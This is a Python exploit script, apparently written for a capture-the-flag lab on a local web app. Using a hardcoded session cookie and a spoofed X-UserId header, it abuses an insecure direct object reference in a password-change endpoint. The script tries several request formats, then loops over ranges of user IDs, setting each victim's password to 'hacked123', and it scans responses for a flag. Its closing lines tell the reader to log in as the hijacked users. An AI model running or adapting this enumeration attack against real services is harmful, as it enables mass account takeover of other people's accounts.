import requests
import json
import sys

BASE_URL = "http://127.0.0.1:33200"
CHANGE_PASSWORD_ENDPOINT = f"{BASE_URL}/password/test"
MY_USER_ID = "10032"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfPOA.b4xDl8YHos70T-UyrMaks8tnRhU"

headers = {
    "X-UserId": MY_USER_ID,
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
}

cookies = {"session": SESSION_COOKIE}

# First, let's try to get the password change page to see the form
print("[+] Attempting to GET /password/test to see the form structure")
try:
    get_response = requests.get(CHANGE_PASSWORD_ENDPOINT, headers=headers, cookies=cookies, timeout=10)
    print(f"GET Status: {get_response.status_code}")
    print(f"GET Response Length: {len(get_response.text)} bytes")
    print(f"GET Response Body (first 500 chars):\n{get_response.text[:500]}")
    if len(get_response.text) > 500:
        print("... (truncated)")
except Exception as e:
    print(f"[-] GET request failed: {e}")

print("\n" + "=" * 80)

# Try different content types and parameter combinations
test_cases = [
    {
        "name": "Form data with current_password",
        "data": {"username": "user10033", "current_password": "password123", "password": "hacked123", "user_id": "10033"},
        "content_type": "application/x-www-form-urlencoded"
    },
    {
        "name": "JSON with current_password", 
        "data": {"username": "user10033", "current_password": "password123", "password": "hacked123", "user_id": "10033"},
        "content_type": "application/json"
    },
    {
        "name": "Form data with old_password",
        "data": {"username": "user10033", "old_password": "password123", "password": "hacked123", "user_id": "10033"},
        "content_type": "application/x-www-form-urlencoded"
    },
    {
        "name": "JSON with old_password",
        "data": {"username": "user10033", "old_password": "password123", "password": "hacked123", "user_id": "10033"},
        "content_type": "application/json"
    },
    {
        "name": "Form data minimal (username, password, user_id)",
        "data": {"username": "user10033", "password": "hacked123", "user_id": "10033"},
        "content_type": "application/x-www-form-urlencoded"
    },
    {
        "name": "JSON minimal (username, password, user_id)",
        "data": {"username": "user10033", "password": "hacked123", "user_id": "10033"},
        "content_type": "application/json"
    }
]

for i, case in enumerate(test_cases, 1):
    print(f"\n[+] Test {i}: {case['name']}")
    
    # Create headers copy and add content type
    test_headers = headers.copy()
    test_headers["Content-Type"] = case["content_type"]
    
    try:
        if case["content_type"] == "application/json":
            # Send as JSON
            response = requests.post(CHANGE_PASSWORD_ENDPOINT, headers=test_headers, cookies=cookies,
                                   data=json.dumps(case["data"]), allow_redirects=False, timeout=10)
        else:
            # Send as form data
            response = requests.post(CHANGE_PASSWORD_ENDPOINT, headers=test_headers, cookies=cookies,
                                   data=case["data"], allow_redirects=False, timeout=10)
        
        print(f"Status Code: {response.status_code}")
        
        if response.status_code == 302:
            location = response.headers.get("Location", "")
            print(f"Redirect to: {location}")
            
            if "/dashboard" in location:
                print("  [!] Success! Redirect to dashboard!")
            elif "error" in location:
                error_msg = location.split("error=")[-1].replace("+", " ")
                print(f"  [-] Error: {error_msg}")
        elif response.status_code == 200:
            print(f"Response Body (first 300 chars):\n{response.text[:300]}")
            if "success" in response.text.lower():
                print("  [!] Success message in response!")
            elif "error" in response.text.lower():
                print("  [-] Error message in response!")
        
        # Check for flags
        if "FLAG{" in response.text:
            flag_start = response.text.find("FLAG{")
            flag_end = response.text.find("}", flag_start) + 1
            if flag_start != -1:
                flag = response.text[flag_start:flag_end]
                print(f"\n[!] FLAG FOUND: {flag}")
        elif "FLAG{" in response.headers.get("Location", ""):
            location = response.headers["Location"]
            flag_start = location.find("FLAG{")
            flag_end = location.find("}", flag_start) + 1
            if flag_start != -1:
                flag = location[flag_start:flag_end]
                print(f"\n[!] FLAG FOUND in redirect: {flag}")
        
    except Exception as e:
        print(f"[-] Request failed: {e}")
    
    print("-" * 60)

# Try a broader range of user_ids with the most promising format
print("\n[+] Testing broader range with JSON format (most likely for API)")
print("=" * 80)

test_user_ids = list(range(1, 21)) + list(range(10025, 10040))
successful_ids = []

for user_id in test_user_ids:
    print(f"\rTesting user_id: {user_id}...", end="", flush=True)
    
    data = {
        "username": f"user{user_id}",
        "password": "hacked123",
        "user_id": str(user_id)
    }
    
    test_headers = headers.copy()
    test_headers["Content-Type"] = "application/json"
    
    try:
        response = requests.post(CHANGE_PASSWORD_ENDPOINT, headers=test_headers, cookies=cookies,
                               data=json.dumps(data), allow_redirects=False, timeout=5)
        
        if response.status_code == 302:
            location = response.headers.get("Location", "")
            if "/dashboard" in location:
                print(f"\n[!] Success with user_id {user_id} - redirect to dashboard!")
                successful_ids.append(user_id)
                
                # Check if flag in redirect
                if "FLAG{" in location:
                    flag_start = location.find("FLAG{")
                    flag_end = location.find("}", flag_start) + 1
                    flag = location[flag_start:flag_end]
                    print(f"[!] FLAG FOUND: {flag}")
                    sys.exit(0)
            
        # Check response body for flag
        if "FLAG{" in response.text:
            flag_start = response.text.find("FLAG{")
            flag_end = response.text.find("}", flag_start) + 1
            flag = response.text[flag_start:flag_end]
            print(f"\n[!] FLAG FOUND in response: {flag}")
            sys.exit(0)
            
    except Exception:
        pass

print(f"\n[+] Completed testing of {len(test_user_ids)} user IDs")
print(f"[+] Successful password changes: {successful_ids}")

if successful_ids:
    print("\n[!] IDOR vulnerability confirmed! We can change passwords for users:", successful_ids)
    print("[+] Use the changed credentials (password: 'hacked123') to login as these users.")
